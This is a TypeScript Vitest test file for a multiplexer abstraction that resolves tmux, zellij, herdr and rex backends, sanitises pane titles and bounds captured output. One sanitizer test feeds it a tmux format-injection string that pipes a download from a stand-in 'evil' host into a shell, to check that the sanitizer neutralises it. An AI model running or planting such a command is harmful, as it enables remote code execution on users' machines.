import { EventEmitter } from "node:events";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { importFresh } from "./test-utils";
import type { LiveMuxTarget } from "../src/multiplexer-live-probes";

describe("getMux live process ownership resolution", () => {
  let savedEnv: NodeJS.ProcessEnv;
  const probes = vi.fn();
  const readContext = vi.fn();

  beforeEach(() => {
    savedEnv = { ...process.env };
    for (const key of [
      "TMUX",
      "TMUX_PANE",
      "ZELLIJ",
      "ZELLIJ_SESSION_NAME",
      "ZELLIJ_PANE_ID",
      "HERDR_ENV",
      "HERDR_SOCKET_PATH",
      "HERDR_PANE_ID",
      "REX_SESSION",
      "REX_BLOCK",
      "REX_SERVER",
      "TERM_PROGRAM",
    ])
      delete process.env[key];
    probes.mockReset();
    readContext
      .mockReset()
      .mockReturnValue({ pid: 100, ancestors: [], processes: new Map() });
    vi.doMock("../src/multiplexer-process-context", () => ({
      readProcessContext: readContext,
      closestMuxAncestor: () => undefined,
    }));
    vi.doMock("../src/multiplexer-live-probes", () => ({
      probeLiveMuxTarget: probes,
    }));
    vi.doMock("node:child_process", () => ({
      execFileSync: vi.fn(() => ""),
      execFile: vi.fn(),
      spawn: vi.fn(),
    }));
  });

  afterEach(() => {
    process.env = savedEnv;
    vi.doUnmock("../src/multiplexer-process-context");
    vi.doUnmock("../src/multiplexer-live-probes");
    vi.doUnmock("node:child_process");
  });

  function nestedMarkers(): void {
    Object.assign(process.env, {
      TMUX: "/tmp/tmux/default,1,0",
      TMUX_PANE: "%4",
      ZELLIJ: "0",
      ZELLIJ_SESSION_NAME: "outer",
      ZELLIJ_PANE_ID: "5",
      HERDR_ENV: "1",
      HERDR_SOCKET_PATH: "/tmp/herdr.sock",
      HERDR_PANE_ID: "w1:p2",
    });
  }

  it.each(["tmux", "zellij", "herdr"] as const)(
    "selects proven inner %s instead of fixed environment precedence",
    async (mux) => {
      nestedMarkers();
      probes.mockImplementation((target: LiveMuxTarget) =>
        target.mux === mux
          ? { kind: "match", target, distance: 0 }
          : { kind: "mismatch" },
      );
      const { getMux } =
        await importFresh<typeof import("../src/multiplexer")>(
          "../src/multiplexer",
        );
      expect(getMux().name).toBe(mux);
      expect(probes).toHaveBeenCalled();
    },
  );

  it.each([
    ["tmux", "zellij"],
    ["zellij", "tmux"],
  ] as const)(
    "chooses nearer %s over matching outer %s",
    async (inner, outer) => {
      nestedMarkers();
      delete process.env.HERDR_ENV;
      delete process.env.HERDR_PANE_ID;
      delete process.env.HERDR_SOCKET_PATH;
      probes.mockImplementation((target: LiveMuxTarget) => ({
        kind: "match",
        target,
        distance: target.mux === inner ? 0 : 3,
      }));
      const { getMux } =
        await importFresh<typeof import("../src/multiplexer")>(
          "../src/multiplexer",
        );
      expect(getMux().name).toBe(inner);
      expect(probes.mock.calls.some(([target]) => target.mux === outer)).toBe(
        true,
      );
    },
  );

  it.each(["mismatch", "unknown"] as const)(
    "fails closed when all advertised panes return %s",
    async (kind) => {
      nestedMarkers();
      probes.mockReturnValue({ kind });
      const { getMux } =
        await importFresh<typeof import("../src/multiplexer")>(
          "../src/multiplexer",
        );
      expect(() => getMux()).toThrow(/context|ownership|verif|current/i);
    },
  );

  it("fails closed when process inspection is unavailable", async () => {
    nestedMarkers();
    readContext.mockReturnValue(undefined);
    const { getMux } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    expect(() => getMux()).toThrow(/context|ownership|verif|current/i);
  });

  it("does not perform live detection for explicit preferences", async () => {
    nestedMarkers();
    const { getMux } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    expect(getMux({ preference: "tmux" }).name).toBe("tmux");
    expect(readContext).not.toHaveBeenCalled();
    expect(probes).not.toHaveBeenCalled();
  });
});

describe("multiplexer module boundary", () => {
  it("loads concrete backends without importing the registry", async () => {
    vi.doMock("../src/multiplexer", () => {
      throw new Error("concrete backends must not import the registry");
    });

    try {
      const { TmuxMultiplexer } = await importFresh<
        typeof import("../src/multiplexer-tmux")
      >("../src/multiplexer-tmux");
      expect(new TmuxMultiplexer().name).toBe("tmux");

      const { ZellijMultiplexer } = await importFresh<
        typeof import("../src/multiplexer-zellij")
      >("../src/multiplexer-zellij");
      expect(new ZellijMultiplexer().name).toBe("zellij");

      const { HerdrMultiplexer } = await importFresh<
        typeof import("../src/multiplexer-herdr")
      >("../src/multiplexer-herdr");
      expect(new HerdrMultiplexer().name).toBe("herdr");

      const { RexMultiplexer } = await importFresh<
        typeof import("../src/multiplexer-rex")
      >("../src/multiplexer-rex");
      expect(new RexMultiplexer().name).toBe("rex");
    } finally {
      vi.doUnmock("../src/multiplexer");
    }
  });
});

/**
 * Test that `getMux({ preference: "auto" })` can find a backend when the
 * user is NOT inside any mux session but the binary is on PATH.
 *
 * Current bug: `TmuxMultiplexer.isAvailable()` and
 * `ZellijMultiplexer.isAvailable()` both check their respective env vars
 * (`TMUX` / `ZELLIJ`) in ADDITION to binary availability. This means the
 * fallback path in `getMux()` — which is supposed to try "whichever
 * backend is available" when no env var matches — skips BOTH backends
 * because `isAvailable()` returns false even though the binary exists.
 *
 * As a result, `getMux()` throws `NoMultiplexerAvailableError` for users
 * in a plain terminal, even if tmux or zellij is installed. The
 * relaxed-spawn path in `createPane()` (which creates a detached session)
 * is never reached.
 *
 * Fix: `isAvailable()` should check binary availability only. The env-var
 * heuristic lives in `getMux()`'s auto-resolution, not in `isAvailable()`.
 */
describe("getMux relaxed-spawn resolution", () => {
  let originalEnv: NodeJS.ProcessEnv;

  beforeEach(() => {
    originalEnv = { ...process.env };
    delete process.env.TMUX;
    delete process.env.ZELLIJ;
    delete process.env.ZELLIJ_SESSION_NAME;
    delete process.env.HERDR_ENV;
    delete process.env.HERDR_SOCKET_PATH;
    delete process.env.REX_SESSION;
    delete process.env.REX_BLOCK;
    delete process.env.REX_SERVER;
    delete process.env.TERM_PROGRAM;
  });

  afterEach(() => {
    process.env = originalEnv;
    vi.doUnmock("node:child_process");
    vi.doUnmock("../src/multiplexer-current-context");
  });

  it("getMux auto returns TmuxMultiplexer when TMUX/ZELLIJ env vars unset but tmux binary exists", async () => {
    // Arrange: mock execFileSync so commandExists("tmux") returns true.
    vi.doMock(
      "node:child_process",
      () =>
        ({
          execFileSync: (_file: string, args: string[]) => {
            const joined = args.join(" ");
            if (joined.includes("command -v 'tmux'")) return "";
            throw new Error("unexpected exec: " + joined);
          },
        }) as unknown as typeof import("node:child_process"),
    );

    const { getMux, __resetMuxInstances } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    __resetMuxInstances();

    // Act
    const mux = getMux({ preference: "auto" });

    // Assert
    expect(mux).toBeDefined();
    expect(mux.name).toBe("tmux");
  });

  it("getMux auto returns ZellijMultiplexer when only the zellij binary exists (relaxed-spawn fallback)", async () => {
    // Regression for the auto-resolution asymmetry: with no env vars set and
    // only zellij on PATH, auto must fall back to zellij (its isAvailable is
    // now binary-only). Previously it threw because zellij.isAvailable()
    // required ZELLIJ === "0".
    vi.doMock(
      "node:child_process",
      () =>
        ({
          execFileSync: (_file: string, args: string[]) => {
            const joined = args.join(" ");
            if (joined.includes("command -v 'zellij'")) return "";
            if (joined.includes("command -v 'tmux'"))
              throw new Error("no tmux");
            throw new Error("unexpected exec: " + joined);
          },
        }) as unknown as typeof import("node:child_process"),
    );

    const { getMux, __resetMuxInstances } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    __resetMuxInstances();

    const mux = getMux({ preference: "auto" });
    expect(mux.name).toBe("zellij");
  });

  it("getMux throws NoMultiplexerAvailableError when neither binary exists", async () => {
    // Arrange: mock execFileSync so commandExists always throws.
    vi.doMock(
      "node:child_process",
      () =>
        ({
          execFileSync: () => {
            throw new Error("ENOENT");
          },
        }) as unknown as typeof import("node:child_process"),
    );

    const { getMux, __resetMuxInstances } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    __resetMuxInstances();

    // Act & Assert
    expect(() => getMux({ preference: "auto" })).toThrow(
      "No multiplexer available",
    );
  });

  it("getMux auto uses a verified Herdr target despite inherited outer markers", async () => {
    vi.doMock("../src/multiplexer-current-context", () => ({
      resolveCurrentMuxContext: () => ({
        kind: "ready",
        target: { mux: "herdr", paneId: "w1:p2", session: "/tmp/herdr.sock" },
      }),
    }));
    process.env.HERDR_ENV = "1";
    process.env.HERDR_SOCKET_PATH = "/tmp/herdr.sock";
    process.env.ZELLIJ_SESSION_NAME = "outer-zellij";
    process.env.TMUX = "/tmp/tmux/default,1,0";
    vi.doMock(
      "node:child_process",
      () =>
        ({
          execFileSync: (_file: string, args: string[]) => {
            if (args.join(" ").includes("command -v 'herdr'")) return "";
            throw new Error("unexpected exec: " + args.join(" "));
          },
        }) as unknown as typeof import("node:child_process"),
    );

    const { getMux, __resetMuxInstances } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    __resetMuxInstances();

    expect(getMux({ preference: "auto" }).name).toBe("herdr");
  });

  it.each([
    ["Agterm", "tmux", { AGTERM_ENABLED: "1" }],
    ["Agterm", "zellij", { AGTERM_ENABLED: "1" }],
    [
      "Orca",
      "tmux",
      {
        ORCA_RUNTIME_SOURCE_ID: "source",
        ORCA_RUNTIME_SOURCE_INCARNATION: "incarnation",
        ORCA_RUNTIME_SOURCE_PROFILE_PATH: "/private/profile",
      },
    ],
    [
      "Orca",
      "zellij",
      {
        ORCA_RUNTIME_SOURCE_ID: "source",
        ORCA_RUNTIME_SOURCE_INCARNATION: "incarnation",
        ORCA_RUNTIME_SOURCE_PROFILE_PATH: "/private/profile",
      },
    ],
  ])(
    "preserves explicit %s-host %s selection with nested mux markers",
    async (_host, preference, hostEnv) => {
      Object.assign(process.env, hostEnv, {
        TMUX: "/tmp/tmux/default,1,0",
        ZELLIJ_SESSION_NAME: "outer-zellij",
      });
      vi.doMock(
        "node:child_process",
        () =>
          ({
            execFileSync: () => {
              throw new Error("explicit mux selection must not probe");
            },
          }) as unknown as typeof import("node:child_process"),
      );

      const { getMux, __resetMuxInstances } =
        await importFresh<typeof import("../src/multiplexer")>(
          "../src/multiplexer",
        );
      __resetMuxInstances();

      expect(getMux({ preference: preference as "tmux" | "zellij" }).name).toBe(
        preference,
      );
    },
  );
  it("auto-selects a live Rex context ahead of inherited tmux markers", async () => {
    vi.doMock("../src/multiplexer-current-context", () => ({
      resolveCurrentMuxContext: () => ({
        kind: "ready",
        target: {
          mux: "rex",
          paneId: "block:01234567-89ab-cdef-0123-456789abcdef",
          session: "session:01234567-89ab-cdef-0123-456789abcdef",
          server: "unix:///tmp/rex.sock",
        },
      }),
    }));
    process.env.REX_SESSION = "session:01234567-89ab-cdef-0123-456789abcdef";
    process.env.REX_BLOCK = "block:01234567-89ab-cdef-0123-456789abcdef";
    process.env.REX_SERVER = "unix:///tmp/rex.sock";
    process.env.TMUX = "/tmp/tmux/default,1,0";
    const session = process.env.REX_SESSION;
    const block = process.env.REX_BLOCK;
    const server = process.env.REX_SERVER;
    vi.doMock("node:child_process", () => ({
      execFileSync: (file: string, args: string[]) => {
        if (file === "/bin/sh") return "";
        if (file === "rex" && args[0] === "help") {
          return "--json --cwd --label --keep-open --shell --focus --split --block --session --trim enter";
        }
        if (file === "rex" && args.includes("whoami")) {
          return JSON.stringify({
            endpoint: server,
            session_id: session,
            block_id: block,
          });
        }
        if (file === "rex" && args.includes("ls")) {
          return JSON.stringify({ blocks: [{ block_id: block }] });
        }
        throw new Error(`unexpected command: ${file} ${args.join(" ")}`);
      },
    }));

    const { getMux, __resetMuxInstances } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    __resetMuxInstances();

    expect(getMux({ preference: "auto" }).name).toBe("rex");
  });

  it("fails closed for a recognized Rex context that cannot be validated", async () => {
    process.env.REX_SESSION = "session:01234567-89ab-cdef-0123-456789abcdef";
    process.env.REX_BLOCK = "block:01234567-89ab-cdef-0123-456789abcdef";
    process.env.REX_SERVER = "unix:///tmp/rex.sock";
    process.env.TMUX = "/tmp/tmux/default,1,0";
    vi.doMock("node:child_process", () => ({
      execFileSync: (file: string, args: string[]) => {
        if (file === "/bin/sh") return "";
        throw new Error(`unexpected command: ${file} ${args.join(" ")}`);
      },
    }));

    const { getMux, __resetMuxInstances } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    __resetMuxInstances();

    expect(() => getMux({ preference: "auto" })).toThrow(/Rex.*(context|CLI)/i);
  });

  it("does not treat TERM_PROGRAM=rex alone as a usable backend", async () => {
    process.env.TERM_PROGRAM = "rex";
    process.env.TMUX = "/tmp/tmux/default,1,0";
    vi.doMock("node:child_process", () => ({
      execFileSync: (file: string, args: string[]) => {
        if (file === "/bin/sh") return "";
        throw new Error(`unexpected command: ${file} ${args.join(" ")}`);
      },
    }));

    const { getMux, __resetMuxInstances } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    __resetMuxInstances();

    expect(() => getMux({ preference: "auto" })).toThrow(/Rex.*(context|CLI)/i);
  });

  it("fails closed when a recognized Zellij session is unavailable", async () => {
    process.env.ZELLIJ_SESSION_NAME = "nested";
    process.env.TMUX = "/tmp/tmux/default,1,0";
    vi.doMock("node:child_process", () => ({
      execFileSync: (file: string, args: string[]) => {
        if (
          file === "/bin/sh" &&
          args.join(" ").includes("command -v 'zellij'")
        ) {
          throw new Error("zellij binary missing");
        }
        throw new Error(`unexpected command: ${file} ${args.join(" ")}`);
      },
    }));

    const { getMux, __resetMuxInstances } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    __resetMuxInstances();

    expect(() => getMux({ preference: "auto" })).toThrow(
      /Zellij context.*unavailable/i,
    );
  });

  it("does not treat a default REX_SERVER alone as a live Rex context", async () => {
    process.env.REX_SERVER = "unix:///tmp/rex.sock";
    vi.doMock("node:child_process", () => ({
      execFileSync: (file: string, args: string[]) => {
        if (
          file === "/bin/sh" &&
          args.join(" ").includes("command -v 'tmux'")
        ) {
          return "";
        }
        throw new Error(`unexpected command: ${file} ${args.join(" ")}`);
      },
    }));

    const { getMux, __resetMuxInstances } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    __resetMuxInstances();

    expect(getMux({ preference: "auto" }).name).toBe("tmux");
  });

  it("keeps explicit mux selection authoritative over Rex markers", async () => {
    process.env.REX_SESSION = "session:01234567-89ab-cdef-0123-456789abcdef";
    process.env.REX_BLOCK = "block:01234567-89ab-cdef-0123-456789abcdef";
    process.env.REX_SERVER = "unix:///tmp/rex.sock";
    vi.doMock("node:child_process", () => ({
      execFileSync: () => {
        throw new Error("explicit selection must not probe");
      },
    }));

    const { getMux, __resetMuxInstances } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    __resetMuxInstances();

    expect(getMux({ preference: "tmux" }).name).toBe("tmux");
    expect(getMux({ preference: "rex" }).name).toBe("rex");
  });
});

describe("safeSegment", () => {
  it("excludes '.' because tmux target syntax reads it as window.pane", async () => {
    // Verified against tmux 3.7b: a window named `review.v2` is created fine,
    // but `select-window -t review.v2` fails with `can't find pane: v2` and
    // `select-window -t sess:review.v2` fails with `can't find window: review`.
    // Focus and the copy-paste attach strings would be permanently broken for
    // any agent whose (model-chosen) name contains a dot.
    const { safeSegment } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    expect(safeSegment("Review.v2")).toBe("review-v2");
    expect(safeSegment("a.b.c")).toBe("a-b-c");
  });

  it("lower-cases, collapses unsafe runs, and trims dashes", async () => {
    const { safeSegment } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    expect(safeSegment("Code Reviewer #2")).toBe("code-reviewer-2");
    expect(safeSegment("  spaced  out  ")).toBe("spaced-out");
    expect(safeSegment("keeps_underscores-and-dashes")).toBe(
      "keeps_underscores-and-dashes",
    );
  });

  it("falls back to 'subagent' when nothing survives", async () => {
    const { safeSegment } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    expect(safeSegment("...")).toBe("subagent");
    expect(safeSegment("")).toBe("subagent");
  });
});

describe("sanitizeViewerTitle", () => {
  it("neutralizes tmux format command execution", async () => {
    // A `display-popup -T` title is a tmux FORMAT: `#(cmd)` spawns a shell job.
    // Verified against tmux 3.7b — `-T '#(touch /tmp/pwn)'` creates the file,
    // and with `#` stripped it does not. `shellEscape` cannot help here: tmux
    // evaluates the format itself, after argv parsing.
    const { sanitizeViewerTitle } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    const title = sanitizeViewerTitle("#(curl http://evil/x | sh)");
    expect(title).not.toContain("#");
    expect(title).toBe("(curl http://evil/x | sh)");
  });

  it("neutralizes tmux format expansion", async () => {
    const { sanitizeViewerTitle } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    expect(sanitizeViewerTitle("#{pane_pid}")).toBe("{pane_pid}");
  });

  it("collapses control characters", async () => {
    const { sanitizeViewerTitle } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    const title = sanitizeViewerTitle("first\r\nsecond\tthird\u001b[2Jfourth");
    expect(title).toBe("first second third [2Jfourth");
  });

  it("strips a leading dash that zellij's clap parser would read as a flag", async () => {
    // Verified against zellij 0.44.3: `new-pane --floating --name '-rf'` exits
    // with `Found argument '-r' which wasn't expected`.
    const { sanitizeViewerTitle } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    expect(sanitizeViewerTitle("-rf agent")).toBe("rf agent");
    expect(sanitizeViewerTitle("--force")).toBe("force");
  });

  it("bounds the title and never yields an empty argument", async () => {
    const { sanitizeViewerTitle, MAX_VIEWER_TITLE_LENGTH } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    expect(sanitizeViewerTitle("x".repeat(500))).toHaveLength(
      MAX_VIEWER_TITLE_LENGTH,
    );
    expect(sanitizeViewerTitle("###")).toBe("subagent");
    expect(sanitizeViewerTitle("   ")).toBe("subagent");
  });
});

describe("spawnNativeViewer", () => {
  afterEach(() => {
    vi.doUnmock("node:child_process");
  });

  it("resolves true only after a detached child survives the grace window", async () => {
    const child = new EventEmitter();
    const unref = vi.fn();
    Object.assign(child, { unref });
    let capturedArgs: string[] | undefined;
    let capturedOptions: unknown;
    vi.doMock("node:child_process", () => ({
      spawn: (_file: string, args: string[], options: unknown) => {
        capturedArgs = args;
        capturedOptions = options;
        return child;
      },
      execFileSync: () => "",
    }));
    const { spawnNativeViewer } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );

    await expect(spawnNativeViewer("tmux", ["display-popup"], 5)).resolves.toBe(
      true,
    );
    expect(capturedArgs).toEqual(["display-popup"]);
    expect(capturedOptions).toEqual({ detached: true, stdio: "ignore" });
    expect(unref).toHaveBeenCalledOnce();
  });

  it("resolves false when the child exits inside the grace window", async () => {
    const child = new EventEmitter();
    Object.assign(child, { unref: vi.fn() });
    vi.doMock("node:child_process", () => ({
      spawn: () => {
        queueMicrotask(() => child.emit("exit", 1, null));
        return child;
      },
      execFileSync: () => "",
    }));
    const { spawnNativeViewer } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );

    await expect(
      spawnNativeViewer("tmux", ["display-popup"], 1000),
    ).resolves.toBe(false);
  });

  it("resolves false when the child emits a startup error", async () => {
    const child = new EventEmitter();
    Object.assign(child, { unref: vi.fn() });
    vi.doMock("node:child_process", () => ({
      spawn: () => {
        queueMicrotask(() => child.emit("error", new Error("ENOENT")));
        return child;
      },
      execFileSync: () => "",
    }));
    const { spawnNativeViewer } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );

    await expect(
      spawnNativeViewer("tmux", ["display-popup"], 1000),
    ).resolves.toBe(false);
  });

  it("resolves false when spawn throws synchronously", async () => {
    vi.doMock("node:child_process", () => ({
      spawn: () => {
        throw new Error("ENOENT");
      },
      execFileSync: () => "",
    }));
    const { spawnNativeViewer } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );

    await expect(
      spawnNativeViewer("tmux", ["display-popup"], 1000),
    ).resolves.toBe(false);
  });
});

describe("MUX_CAPABILITIES", () => {
  it("is keyed by backend name so UI code can gate on state.mux alone", async () => {
    const { MUX_CAPABILITIES, muxCapabilities } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    expect(Object.keys(MUX_CAPABILITIES).sort()).toEqual([
      "herdr",
      "rex",
      "tmux",
      "zellij",
    ]);
    expect(muxCapabilities("tmux")).toBe(MUX_CAPABILITIES.tmux);
    expect(muxCapabilities("zellij")).toBe(MUX_CAPABILITIES.zellij);
    expect(muxCapabilities("herdr")).toBe(MUX_CAPABILITIES.herdr);
    expect(muxCapabilities("rex")).toBe(MUX_CAPABILITIES.rex);
  });

  it("is the single source of truth both backends expose", async () => {
    const { MUX_CAPABILITIES } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    const { ZellijMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-zellij")
    >("../src/multiplexer-zellij");
    const { HerdrMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-herdr")
    >("../src/multiplexer-herdr");

    expect(new TmuxMultiplexer().capabilities).toEqual(MUX_CAPABILITIES.tmux);
    expect(new ZellijMultiplexer().capabilities).toEqual(
      MUX_CAPABILITIES.zellij,
    );
    expect(new HerdrMultiplexer().capabilities).toEqual(MUX_CAPABILITIES.herdr);
    const { RexMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-rex")
    >("../src/multiplexer-rex");
    expect(new RexMultiplexer().capabilities).toEqual(MUX_CAPABILITIES.rex);
  });
});

describe("commandExists", () => {
  it("probes with a non-login shell", async () => {
    // `-lc` sources the user's profile on every availability probe: slow, has
    // side effects, and can report a PATH we don't actually spawn children with.
    const calls: string[][] = [];
    vi.doMock("node:child_process", () => ({
      execFileSync: (_file: string, args: string[]) => {
        calls.push(args);
        return "";
      },
    }));
    const { commandExists } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );

    expect(commandExists("tmux")).toBe(true);
    expect(calls[0]![0]).toBe("-c");
    expect(calls[0]).not.toContain("-lc");
    expect(calls[0]![1]).toBe("command -v 'tmux'");
  });
});

describe("boundCaptureOutput UTF-8 safety", () => {
  it("does not start a byte-truncated preview mid-codepoint", async () => {
    const { boundCaptureOutput } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    // "café" is 5 bytes (é = c3 a9). maxBytes 1 lands on the continuation
    // byte 0xa9; advancing past it must yield an empty string, not U+FFFD.
    const midSequence = boundCaptureOutput("café", {
      maxLines: 10,
      maxBytes: 1,
    });
    expect(midSequence.truncated).toBe(true);
    expect(midSequence.output).not.toContain("\uFFFD");
    expect(Buffer.byteLength(midSequence.output, "utf8")).toBeLessThanOrEqual(
      1,
    );
    expect(midSequence.output).toBe("");

    // maxBytes 2 lands on the lead byte of é — keep the full character.
    const onLead = boundCaptureOutput("café", {
      maxLines: 10,
      maxBytes: 2,
    });
    expect(onLead.truncated).toBe(true);
    expect(onLead.output).not.toContain("\uFFFD");
    expect(Buffer.byteLength(onLead.output, "utf8")).toBeLessThanOrEqual(2);
    expect(onLead.output).toBe("é");
  });
});

describe("boundCaptureOutput bounds", () => {
  it("keeps the TAIL of the output — the newest pane lines matter", async () => {
    const { boundCaptureOutput } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    expect(
      boundCaptureOutput("one\ntwo\nthree\nfour", {
        maxLines: 2,
        maxBytes: 4096,
      }),
    ).toEqual({ output: "three\nfour", truncated: true });
  });

  it("reports untruncated when the output already fits", async () => {
    const { boundCaptureOutput } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    expect(
      boundCaptureOutput("one\ntwo", { maxLines: 10, maxBytes: 4096 }),
    ).toEqual({ output: "one\ntwo", truncated: false });
    // Exactly at the line bound is not truncation.
    expect(
      boundCaptureOutput("one\ntwo", { maxLines: 2, maxBytes: 4096 }),
    ).toEqual({ output: "one\ntwo", truncated: false });
  });

  it("empties the output when maxLines is zero", async () => {
    const { boundCaptureOutput } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    expect(
      boundCaptureOutput("one\ntwo", { maxLines: 0, maxBytes: 4096 }),
    ).toEqual({ output: "", truncated: true });
    // ...but empty input with a zero bound is not "truncated".
    expect(boundCaptureOutput("", { maxLines: 0, maxBytes: 4096 })).toEqual({
      output: "",
      truncated: false,
    });
  });

  it("clamps negative and fractional bounds instead of producing garbage", async () => {
    const { boundCaptureOutput } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    expect(
      boundCaptureOutput("one\ntwo", { maxLines: -5, maxBytes: -5 }),
    ).toEqual({ output: "", truncated: true });
    expect(
      boundCaptureOutput("one\ntwo\nthree", { maxLines: 2.9, maxBytes: 4096 }),
    ).toEqual({ output: "two\nthree", truncated: true });
  });

  it("applies the byte bound after the line bound", async () => {
    const { boundCaptureOutput } =
      await importFresh<typeof import("../src/multiplexer")>(
        "../src/multiplexer",
      );
    // maxLines 2 -> "three\nfour" (10 bytes), then maxBytes 7 -> "ee\nfour".
    expect(
      boundCaptureOutput("one\ntwo\nthree\nfour", { maxLines: 2, maxBytes: 7 }),
    ).toEqual({ output: "ee\nfour", truncated: true });
  });
});
